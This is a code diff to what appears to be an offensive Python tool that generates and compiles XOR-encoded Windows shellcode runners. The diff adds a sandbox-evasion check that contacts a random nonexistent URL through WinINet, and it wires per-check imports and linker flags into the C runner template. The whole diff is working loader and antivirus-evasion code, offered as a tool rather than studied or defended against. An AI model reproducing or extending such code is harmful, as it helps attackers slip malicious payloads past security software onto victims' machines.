@@ -7,7 +7,6 @@ import subprocess
 
 import emoji
 import psutil
-from art import aprint
 from termcolor import cprint, colored
 
 
@@ -40,8 +39,16 @@ class Bypass:
     def get_template(self):
         raise NotImplemented()
 
-    def get_import(self):
-        raise NotImplemented()
+    def additional_import(self):
+        return ""
+
+    def additional_flags(self):
+        return []
+
+    def get_call(self):
+        return '''
+        {func_name}() == 1
+        '''.format(func_name=self.func_name)
 
 
 class VerifyInputName(Bypass):
@@ -74,10 +81,7 @@ int {func_name}(const char *{arg_name}) {{
     def get_call(self):
         return '''
         {func_name}(argv[0]) == 1
-        '''.format(
-            func_name=self.func_name,
-            arg_name=self.arg_name,
-            binary_name=self.binary_name)
+        '''.format(func_name=self.func_name)
 
     @staticmethod
     def ask_for_binary_name():
@@ -117,11 +121,6 @@ int {0}() {{
             ShellCoder.make_random_str(),
         )
 
-    def get_call(self):
-        return '''
-        {func_name}() == 1
-        '''.format(func_name=self.func_name)
-
 
 class HundredMillionIncrements(Bypass):
 
@@ -156,11 +155,6 @@ int {0}() {{
             ShellCoder.make_random_str()
         )
 
-    def get_call(self):
-        return '''
-        {func_name}() == 1
-        '''.format(func_name=self.func_name)
-
 
 class AttemptToOpenASystemProcess(Bypass):
     def __init__(self):
@@ -190,10 +184,55 @@ int {0}() {{
             ShellCoder.make_random_str()
         )
 
-    def get_call(self):
+
+class AttemptToOpenANonExistingURL(Bypass):
+    def __init__(self):
+        super().__init__()
+
+    @staticmethod
+    def menu():
+        return "Attempt to open a non-existing URL"
+
+    def additional_import(self):
+        return """#include <wininet.h>
+#pragma comment(lib, "wininet.lib")
+        """
+
+    def additional_flags(self):
+        return ["-lwininet"]
+
+    def get_template(self):
         return '''
-        {func_name}() == 1
-        '''.format(func_name=self.func_name)
+        
+int {0}() {{
+    char {1}[] = "http://{2}.{3}.com/";
+    char {4}[1024];
+    HINTERNET {5}, {6};
+    DWORD {7};
+    {5}=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);
+    {6}=InternetOpenUrl({5},{1},NULL,NULL,INTERNET_FLAG_RELOAD|INTERNET_FLAG_NO_CACHE_WRITE,NULL);
+    
+    if ({6}) {{
+      InternetCloseHandle({5});
+      InternetCloseHandle({6});
+      return 0;
+    }}
+    
+     InternetCloseHandle({5});
+     InternetCloseHandle({6});
+     
+     return 1;
+}}
+        '''.format(
+            self.func_name,
+            ShellCoder.make_random_str(),
+            ShellCoder.make_random_str(),
+            ShellCoder.make_random_str(),
+            ShellCoder.make_random_str(),
+            ShellCoder.make_random_str(),
+            ShellCoder.make_random_str(),
+            ShellCoder.make_random_str(),
+        )
 
 
 class ShellCoder:
@@ -205,6 +244,7 @@ class ShellCoder:
     selected_bypass = []
     shellcode_path = None
     template_path = None
+    additional_flags = []
 
     ARCH_X64 = 1
     ARCH_X86 = 2
@@ -344,6 +384,7 @@ class Windows(ShellCoder):
         AllocateAndFill100M0Memory,
         HundredMillionIncrements,
         AttemptToOpenASystemProcess,
+        AttemptToOpenANonExistingURL,
     ]
 
     def __init__(self):
@@ -404,7 +445,7 @@ class Windows(ShellCoder):
         with open(self.shellcode_path, "rb") as raw_shellcode:
             return self.xor_shellcode(bytearray(raw_shellcode.read()), x_key)
 
-    def shellcode_runner_template(self, bypass_functions, bypass_calls):
+    def shellcode_runner_template(self, bypass_functions, bypass_calls, bypass_imports):
         xor_var = self.make_random_str()
         xor_key = self.make_random_str()
         shellcode_var = self.make_random_str()
@@ -415,6 +456,7 @@ class Windows(ShellCoder):
         encoded_shellcode = self.open_shellcode(xor_key)
         return """#include <windows.h>
 #include <string>
+{bypass_imports}
 using namespace std;
 
 {bypass_functions}
@@ -443,6 +485,7 @@ if ({bypass_calls}) {{
         """.format(
             bypass_functions=bypass_functions,
             bypass_calls=bypass_calls,
+            bypass_imports=bypass_imports,
             xor_var=xor_var,
             xor_key=xor_key,
             shellcode_var=shellcode_var,
@@ -527,17 +570,23 @@ if ({bypass_calls}) {{
     def gen_bypass(self):
         bypass_functions = []
         bypass_calls = []
+        bypass_imports = []
 
         for bypass in self.selected_bypass:
             b = bypass()
             bypass_functions.append(b.get_template())
             bypass_calls.append(b.get_call())
 
-        return '\n\n'.join(bypass_functions), ' && '.join(bypass_calls)
+            if b.additional_import() != "":
+                bypass_imports.append(b.additional_import())
+
+            self.additional_flags = self.additional_flags + b.additional_flags()
+
+        return '\n\n'.join(bypass_functions), ' && '.join(bypass_calls), '\n'.join(bypass_imports)
 
     def gen_template(self):
-        bypass_functions, bypass_calls = self.gen_bypass()
-        template = self.shellcode_runner_template(bypass_functions, bypass_calls)
+        bypass_functions, bypass_calls, bypass_imports = self.gen_bypass()
+        template = self.shellcode_runner_template(bypass_functions, bypass_calls, bypass_imports)
         self.template_path = "%s/template.c" % self.output_path
         self.write_template(template)
 
@@ -559,6 +608,10 @@ if ({bypass_calls}) {{
                    '-static-libstdc++ ' \
                    '-static-libgcc ' \
                    '-Wl,--gc-sections'
+
+        for flag in self.additional_flags:
+            if flag not in command:
+                command += " %s " % flag
 
         compile_script = """
 #!/bin/bash
